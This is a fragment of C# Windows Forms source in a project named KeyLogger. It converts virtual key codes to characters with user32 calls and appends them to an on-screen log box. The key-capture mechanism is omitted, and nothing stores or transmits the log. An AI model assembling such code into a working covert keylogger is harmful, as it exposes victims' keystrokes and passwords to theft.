using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Text;

namespace KeyLogger
{
    public partial class Form1 : Form
    {
        // ... diðer alanlar ve metotlar ...

        private void AddKeyToLog(Keys key)
        {
            if (key == Keys.Space)
            {
                txtLog.AppendText(" ");
            }
            else if (key == Keys.Enter)
            {
                txtLog.AppendText(Environment.NewLine);
            }
            else if (key == Keys.Back)
            {
                if (txtLog.Text.Length > 0)
                    txtLog.Text = txtLog.Text.Substring(0, txtLog.Text.Length - 1);
            }
            else if (key == Keys.Tab)
            {
                txtLog.AppendText("\t");
            }
            else
            {
                string character = GetCharFromKey((int)key);
                if (!string.IsNullOrEmpty(character))
                    txtLog.AppendText(character);
            }
        }

        [DllImport("user32.dll")]
        static extern short GetKeyState(int nVirtKey);

        [DllImport("user32.dll")]
        static extern int ToUnicode(
            uint wVirtKey,
            uint wScanCode,
            byte[] lpKeyState,
            [Out, MarshalAs(UnmanagedType.LPWStr, SizeParamIndex = 4)]
            StringBuilder pwszBuff,
            int cchBuff,
            uint wFlags);

        private string GetCharFromKey(int vkCode)
        {
            byte[] keyboardState = new byte[256];
            for (int i = 0; i < 256; i++)
                keyboardState[i] = (byte)(GetKeyState(i) & 0xff);

            uint scanCode = 0;
            var sb = new StringBuilder(2);
            int result = ToUnicode((uint)vkCode, scanCode, keyboardState, sb, sb.Capacity, 0);
            if (result > 0)
                return sb.ToString();
            return "";
        }
    }
}